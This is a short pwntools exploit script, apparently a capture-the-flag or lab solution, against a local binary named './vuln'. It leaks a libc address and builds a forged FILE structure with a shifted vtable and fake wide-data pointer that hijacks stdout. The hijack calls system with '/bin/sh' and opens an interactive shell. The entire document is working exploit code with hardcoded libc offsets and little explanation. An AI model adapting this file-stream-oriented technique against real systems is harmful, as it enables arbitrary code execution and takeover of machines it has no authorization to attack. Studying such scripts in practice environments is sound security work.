from pwn import *

name = './vuln'
elf = context.binary = ELF(name)
p = process(name)
libc = elf.libc
#gdb.attach(p, 'b __GI__IO_wfile_overflow')

printf_leak = int(p.recvline()[:-1], 16)
libc.address = printf_leak - libc.sym['printf']
stdout = libc.address + 0x1d75c0
stdout_lock = libc.address + 0x1d8710

fp = FileStructure()
fp.flags = b' /bin/sh' #space here allows us to pass checks
fp.fileno = 1
fp._wide_data = stdout+0xe0
fp._lock = stdout_lock
fp.vtable = libc.address + 0x1d5328 - 0x38 #so we can hit file overflow

p.sendline(hex(stdout))

payload = bytes(fp) # file structure we are impersonating
payload += cyclic(24) + p64(0) + cyclic(16) + p64(0) + cyclic(48) + p64(libc.sym['system']) + cyclic(112) #need to pass abunch of checks
payload += p64(stdout+0xe0) # fake wide_data stuffs
p.sendline(payload)

p.interactive()